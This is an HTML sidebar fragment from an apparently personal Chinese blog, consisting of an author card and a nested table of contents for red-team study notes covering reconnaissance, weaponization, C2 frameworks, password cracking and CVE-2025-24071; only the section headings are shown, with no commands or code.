class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/image/png.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">dgh</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">红队基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%84%E4%BC%B0%E5%92%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%99%90%E5%88%B6"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞评估和渗透测试限制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%84%E4%BC%B0"><span class="toc-number">1.1.1.</span> <span class="toc-text">漏洞评估</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">1.1.2.</span> <span class="toc-text">渗透测试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%80%A7%E5%A8%81%E8%83%81%EF%BC%88APT%EF%BC%89%E5%8F%8A%E4%B8%BA%E4%BD%95%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%8D%E8%B6%B3%E4%BB%A5%E5%BA%94%E5%AF%B9"><span class="toc-number">1.1.3.</span> <span class="toc-text">高级持续性威胁（APT）及为何常规渗透测试不足以应对</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-vs-%E7%9C%9F%E5%AE%9E%E6%94%BB%E5%87%BB%E7%9A%84%E5%85%B3%E9%94%AE%E5%8C%BA%E5%88%AB"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">渗透测试 vs. 真实攻击的关键区别</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E5%B1%80%E9%99%90%E6%80%A7"><span class="toc-number">1.1.3.1.1.</span> <span class="toc-text">(1) 渗透测试的局限性</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-%E7%9C%9F%E5%AE%9E%E6%94%BB%E5%87%BB%E8%80%85%EF%BC%88%E5%B0%A4%E5%85%B6%E6%98%AFAPT%EF%BC%89%E7%9A%84%E7%89%B9%E7%82%B9"><span class="toc-number">1.1.3.1.2.</span> <span class="toc-text">(2) 真实攻击者（尤其是APT）的特点</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-APT-%E7%9B%B8%E5%85%B3%E7%9A%84%E7%8E%B0%E5%AE%9E%E9%97%AE%E9%A2%98"><span class="toc-number">1.1.3.1.3.</span> <span class="toc-text">2. APT 相关的现实问题</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%EF%BC%9A%E7%BA%A2%E9%98%9F%E6%BC%94%E7%BB%83%EF%BC%88Red-Team-Engagements%EF%BC%89"><span class="toc-number">1.1.3.1.4.</span> <span class="toc-text">3. 解决方案：红队演练（Red Team Engagements）</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.1.3.1.5.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%A2%E9%98%9F%E6%BC%94%E7%BB%83"><span class="toc-number">1.2.</span> <span class="toc-text">红队演练</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BA%A2%E9%98%9F%E6%BC%94%E7%BB%83%E7%9A%84%E6%BC%94%E5%8F%98%E5%8F%8A%E5%85%B6%E4%B8%8E%E4%BC%A0%E7%BB%9F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.2.1.</span> <span class="toc-text">红队演练的演变及其与传统渗透测试的区别</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E7%BA%A2%E9%98%9F%E6%BC%94%E7%BB%83%E7%9A%84%E6%A0%B8%E5%BF%83%E7%9B%AE%E6%A0%87"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">1. 红队演练的核心目标</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E7%BA%A2%E9%98%9F%E6%A6%82%E5%BF%B5%E7%9A%84%E5%86%9B%E4%BA%8B%E6%9D%A5%E6%BA%90"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">2. 红队概念的军事来源</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E7%BA%A2%E9%98%9F%E6%BC%94%E7%BB%83%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">3. 红队演练的流程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E7%9C%9F%E5%AE%9E%E6%A1%88%E4%BE%8B%EF%BC%9A%E7%9B%AE%E6%A0%87%E6%98%AF%E5%85%A5%E4%BE%B5%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">4. 真实案例：目标是入侵内网服务器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E5%85%B3%E9%94%AE%E7%82%B9%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.1.5.</span> <span class="toc-text">5. 关键点总结</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BA%A2%E9%98%9F%E6%BC%94%E7%BB%83%E7%9A%84%E6%9C%80%E7%BB%88%E7%9B%AE%E6%A0%87%E5%8F%8A%E4%B8%8D%E5%90%8C%E6%96%B9%E5%BC%8F"><span class="toc-number">1.2.2.</span> <span class="toc-text">红队演练的最终目标及不同方式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E7%BA%A2%E9%98%9F%E7%9A%84%E6%9C%80%E7%BB%88%E7%9B%AE%E6%A0%87%EF%BC%9A%E6%8F%90%E5%8D%87%E8%93%9D%E9%98%9F%E7%9A%84%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%93%8D%E5%BA%94%E8%83%BD%E5%8A%9B"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">1. 红队的最终目标：提升蓝队的检测与响应能力</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E7%BA%A2%E9%98%9F%E7%9B%B8%E6%AF%94%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E8%BF%9B%E9%98%B6%E6%8F%90%E5%8D%87"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">2. 红队相比渗透测试的进阶提升</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E7%BA%A2%E9%98%9F%E6%BC%94%E7%BB%83%E7%9A%84%E4%B8%8D%E5%90%8C%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8F"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">3. 红队演练的不同执行方式</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%85%B3%E9%94%AE%E7%82%B9%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.3.</span> <span class="toc-text">4. 关键点总结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A4%E6%88%98%E7%BB%93%E6%9E%84"><span class="toc-number">1.3.</span> <span class="toc-text">交战结构</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BA%A2%E9%98%9F%E7%9A%84%E6%A0%B8%E5%BF%83%E8%81%8C%E8%83%BD%EF%BC%9A%E5%AF%B9%E6%8A%97%E6%A8%A1%E6%8B%9F"><span class="toc-number">1.3.1.</span> <span class="toc-text">红队的核心职能：对抗模拟</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E7%BA%A2%E9%98%9F%E7%9A%84%E5%AF%B9%E6%8A%97%E6%A8%A1%E6%8B%9F%EF%BC%88Adversary-Emulation%EF%BC%89"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">1. 红队的对抗模拟（Adversary Emulation）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E9%93%BE%E6%A8%A1%E5%9E%8B"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">2. 常见的网络攻击链模型</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-Lockheed-Martin-Cyber-Kill-Chain"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">3. Lockheed Martin Cyber Kill Chain</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%85%B3%E9%94%AE%E7%82%B9%E6%80%BB%E7%BB%93-1"><span class="toc-number">1.3.2.</span> <span class="toc-text">4. 关键点总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%A2%E9%98%9F%E4%BE%A6%E5%AF%9F"><span class="toc-number">2.</span> <span class="toc-text">红队侦察</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%A6%E5%AF%9F%E5%88%86%E7%B1%BB"><span class="toc-number">2.1.</span> <span class="toc-text">侦察分类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A2%AB%E5%8A%A8%E4%BE%A6%E5%AF%9F%EF%BC%88Passive-Recon%EF%BC%89"><span class="toc-number">2.1.1.</span> <span class="toc-text">被动侦察（Passive Recon）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E5%8A%A8%E4%BE%A6%E5%AF%9F%EF%BC%88Active-Recon%EF%BC%89"><span class="toc-number">2.1.2.</span> <span class="toc-text">主动侦察（Active Recon）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E5%8A%A8%E4%BE%A6%E5%AF%9F%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-number">2.1.3.</span> <span class="toc-text">主动侦察的分类</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E5%B7%A5%E5%85%B7"><span class="toc-number">2.2.</span> <span class="toc-text">内置工具</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#whois"><span class="toc-number">2.2.1.</span> <span class="toc-text">whois</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nslookup"><span class="toc-number">2.2.2.</span> <span class="toc-text">nslookup</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dig"><span class="toc-number">2.2.3.</span> <span class="toc-text">dig</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#host"><span class="toc-number">2.2.4.</span> <span class="toc-text">host</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#traceroute"><span class="toc-number">2.2.5.</span> <span class="toc-text">traceroute</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AB%98%E7%BA%A7%E6%90%9C%E7%B4%A2"><span class="toc-number">2.3.</span> <span class="toc-text">高级搜索</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%A6%82%E4%BD%95%E6%B3%84%E9%9C%B2%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%EF%BC%9F"><span class="toc-number">2.3.0.1.</span> <span class="toc-text">搜索引擎如何泄露敏感信息？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B6%E4%BB%96-OSINT-%E6%95%B0%E6%8D%AE%E6%9D%A5%E6%BA%90"><span class="toc-number">2.3.0.2.</span> <span class="toc-text">其他 OSINT 数据来源</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93"><span class="toc-number">2.3.0.3.</span> <span class="toc-text">社交媒体</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">2.3.0.3.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">2.3.0.3.2.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8B%9B%E8%81%98%E5%B9%BF%E5%91%8A%EF%BC%88Job-Ads%EF%BC%89"><span class="toc-number">2.3.0.4.</span> <span class="toc-text">招聘广告（Job Ads）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%93%E4%B8%9A%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E"><span class="toc-number">2.4.</span> <span class="toc-text">专业搜索引擎</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#WHOIS-%E5%92%8C-DNS-%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%EF%BC%88WHOIS-and-DNS-Related%EF%BC%89"><span class="toc-number">2.4.1.</span> <span class="toc-text">WHOIS 和 DNS 相关信息（WHOIS and DNS Related）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ViewDNS-info"><span class="toc-number">2.4.2.</span> <span class="toc-text">ViewDNS.info</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-number">2.4.3.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-2"><span class="toc-number">2.4.4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Censys"><span class="toc-number">2.4.5.</span> <span class="toc-text">Censys</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-ng"><span class="toc-number">2.5.</span> <span class="toc-text">Recon-ng</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Maltego"><span class="toc-number">2.6.</span> <span class="toc-text">Maltego</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Weaponization-%E6%AD%A6%E5%99%A8%E5%8C%96-%E7%BA%A2%E9%98%9F"><span class="toc-number">3.</span> <span class="toc-text">Weaponization(武器化)-红队</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-Scripting-Host-WSH"><span class="toc-number">3.1.</span> <span class="toc-text">Windows Scripting Host (WSH)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTML-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%EF%BC%88HTA%EF%BC%89"><span class="toc-number">3.2.</span> <span class="toc-text">HTML 应用程序（HTA）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#HTA-%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-number">3.2.1.</span> <span class="toc-text">HTA 反向连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-Metasploit-%E5%8F%91%E8%B5%B7%E7%9A%84%E6%81%B6%E6%84%8F-HTA"><span class="toc-number">3.2.2.</span> <span class="toc-text">通过 Metasploit 发起的恶意 HTA</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E8%BF%90%E8%A1%8C-Metasploit"><span class="toc-number">3.2.2.1.</span> <span class="toc-text">1. 运行 Metasploit</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8-hta-server-%E6%A8%A1%E5%9D%97"><span class="toc-number">3.2.2.2.</span> <span class="toc-text">2. 使用 hta_server 模块</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E5%8F%97%E5%AE%B3%E8%80%85%E6%89%A7%E8%A1%8C-HTA-%E6%96%87%E4%BB%B6"><span class="toc-number">3.2.2.3.</span> <span class="toc-text">3. 受害者执行 HTA 文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E8%BF%9B%E5%85%A5-Meterpreter-%E4%BC%9A%E8%AF%9D"><span class="toc-number">3.2.2.4.</span> <span class="toc-text">4. 进入 Meterpreter 会话</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E8%BF%9B%E4%B8%80%E6%AD%A5%E6%93%8D%E4%BD%9C"><span class="toc-number">3.2.2.5.</span> <span class="toc-text">5. 进一步操作</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Visual-Basic-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F-VBA"><span class="toc-number">3.3.</span> <span class="toc-text">Visual Basic 应用程序 - VBA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerShell%EF%BC%88PSH%EF%BC%89"><span class="toc-number">3.4.</span> <span class="toc-text">PowerShell（PSH）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C-PowerShell-%E8%84%9A%E6%9C%AC"><span class="toc-number">3.4.1.</span> <span class="toc-text">运行 PowerShell 脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5%EF%BC%88Execution-Policy%EF%BC%89"><span class="toc-number">3.4.2.</span> <span class="toc-text">执行策略（Execution Policy）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5%EF%BC%88Bypass-Execution-Policy%EF%BC%89"><span class="toc-number">3.4.3.</span> <span class="toc-text">绕过执行策略（Bypass Execution Policy）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%9C%A8%E6%94%BB%E5%87%BB%E6%9C%BA%E4%B8%8A%E4%B8%8B%E8%BD%BD-Powercat"><span class="toc-number">3.4.4.</span> <span class="toc-text">1. 在攻击机上下载 Powercat</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%90%AF%E5%8A%A8-Web-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%89%98%E7%AE%A1-Powercat"><span class="toc-number">3.4.5.</span> <span class="toc-text">2. 启动 Web 服务器托管 Powercat</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91-Shell"><span class="toc-number">3.4.6.</span> <span class="toc-text">3.监听端口接收反向 Shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%9C%A8%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E4%B8%8A%E6%89%A7%E8%A1%8C-PowerShell-%E8%BD%BD%E8%8D%B7"><span class="toc-number">3.4.7.</span> <span class="toc-text">4. 在目标机器上执行 PowerShell 载荷</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E5%9C%A8%E6%94%BB%E5%87%BB%E6%9C%BA%E4%B8%8A%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91-Shell"><span class="toc-number">3.4.8.</span> <span class="toc-text">5. 在攻击机上接收反向 Shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CS2"><span class="toc-number">3.5.</span> <span class="toc-text">CS2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6%EF%BC%88C2%EF%BC%89%EF%BC%9F"><span class="toc-number">3.5.1.</span> <span class="toc-text">什么是命令与控制（C2）？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cobalt-Strike"><span class="toc-number">3.5.2.</span> <span class="toc-text">Cobalt Strike</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PowerShell-Empire"><span class="toc-number">3.5.3.</span> <span class="toc-text">PowerShell Empire</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Metasploit"><span class="toc-number">3.5.4.</span> <span class="toc-text">Metasploit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB"><span class="toc-number">4.</span> <span class="toc-text">密码攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">4.1.</span> <span class="toc-text">介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%AF%86%E7%A0%81%EF%BC%9F"><span class="toc-number">4.1.1.</span> <span class="toc-text">什么是密码？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E5%A6%82%E4%BD%95%EF%BC%9F"><span class="toc-number">4.1.2.</span> <span class="toc-text">密码的安全性如何？</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF"><span class="toc-number">4.2.</span> <span class="toc-text">密码攻击技术</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-vs-%E5%AF%86%E7%A0%81%E7%8C%9C%E6%B5%8B"><span class="toc-number">4.2.1.</span> <span class="toc-text">密码破解 vs. 密码猜测</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%901"><span class="toc-number">4.3.</span> <span class="toc-text">密码分析1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81"><span class="toc-number">4.3.1.</span> <span class="toc-text">默认密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%B1%E5%AF%86%E7%A0%81"><span class="toc-number">4.3.2.</span> <span class="toc-text">弱密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E5%AF%86%E7%A0%81"><span class="toc-number">4.3.3.</span> <span class="toc-text">泄露密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%84%E5%90%88%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8"><span class="toc-number">4.3.4.</span> <span class="toc-text">组合密码字典</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9A%E5%88%B6%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8"><span class="toc-number">4.3.5.</span> <span class="toc-text">定制密码字典</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E5%90%8D%E5%AD%97%E5%85%B8"><span class="toc-number">4.3.6.</span> <span class="toc-text">用户名字典</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-username-generator-%E7%94%9F%E6%88%90%E7%94%A8%E6%88%B7%E5%90%8D%E5%88%97%E8%A1%A8"><span class="toc-number">4.3.7.</span> <span class="toc-text">使用 username_generator 生成用户名列表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E8%87%AA%E5%AE%9A%E4%B9%89%E7%94%A8%E6%88%B7%E5%90%8D%E5%88%97%E8%A1%A8"><span class="toc-number">4.3.8.</span> <span class="toc-text">生成自定义用户名列表</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2025-24071%EF%BC%9A%E9%80%9A%E8%BF%87-RAR-ZIP-%E6%8F%90%E5%8F%96%E5%92%8C-library-ms-%E6%96%87%E4%BB%B6%E5%8F%91%E7%94%9F-NTLM-%E5%93%88%E5%B8%8C%E6%B3%84%E6%BC%8F"><span class="toc-number"></span> <span class="toc-text">CVE-2025-24071：通过 RAR&#x2F;ZIP 提取和 .library-ms 文件发生 NTLM 哈希泄漏</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%902"><span class="toc-number">0.1.</span> <span class="toc-text">密码分析2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Keyspace-Technique%E9%94%AE%E7%A9%BA%E9%97%B4%E6%8A%80%E6%9C%AF"><span class="toc-number">0.1.1.</span> <span class="toc-text">Keyspace Technique键空间技术</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CUPP-%E5%B8%B8%E8%A7%81%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E7%94%9F%E6%88%90%E5%99%A8"><span class="toc-number">0.1.2.</span> <span class="toc-text">CUPP - 常见用户密码生成器</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C-CUPP"><span class="toc-number">0.1.2.1.</span> <span class="toc-text">运行 CUPP</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%A4%E4%BA%92%E6%A8%A1%E5%BC%8F%E7%A4%BA%E4%BE%8B%EF%BC%9A"><span class="toc-number">0.1.2.2.</span> <span class="toc-text">交互模式示例：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E9%A2%84%E7%BD%AE%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8"><span class="toc-number">0.1.2.3.</span> <span class="toc-text">下载预置密码字典</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Alecto-%E9%BB%98%E8%AE%A4%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">0.1.2.4.</span> <span class="toc-text">Alecto 默认用户名和密码数据库</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A6%BB%E7%BA%BF%E6%94%BB%E5%87%BB1"><span class="toc-number">0.2.</span> <span class="toc-text">离线攻击1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E5%85%B8%E6%94%BB%E5%87%BB"><span class="toc-number">0.2.1.</span> <span class="toc-text">字典攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E5%AD%97%E5%85%B8%E6%94%BB%E5%87%BB"><span class="toc-number">0.2.1.1.</span> <span class="toc-text">执行字典攻击</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%A0%B4%E8%A7%A3%E7%BB%93%E6%9E%9C"><span class="toc-number">0.2.1.2.</span> <span class="toc-text">查看破解结果</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB"><span class="toc-number">0.2.2.</span> <span class="toc-text">暴力破解攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B-Hashcat-%E5%8F%AF%E7%94%A8%E7%9A%84%E5%AD%97%E7%AC%A6%E9%9B%86"><span class="toc-number">0.2.2.1.</span> <span class="toc-text">查看 Hashcat 可用的字符集</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB%E6%A8%A1%E5%BC%8F"><span class="toc-number">0.2.2.2.</span> <span class="toc-text">使用暴力破解攻击模式</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3-MD5-%E5%93%88%E5%B8%8C%E7%9A%84-4-%E4%BD%8D-PIN"><span class="toc-number">0.2.2.3.</span> <span class="toc-text">破解 MD5 哈希的 4 位 PIN</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-3"><span class="toc-number">0.2.3.</span> <span class="toc-text">总结</span></a></li></ol></li><li 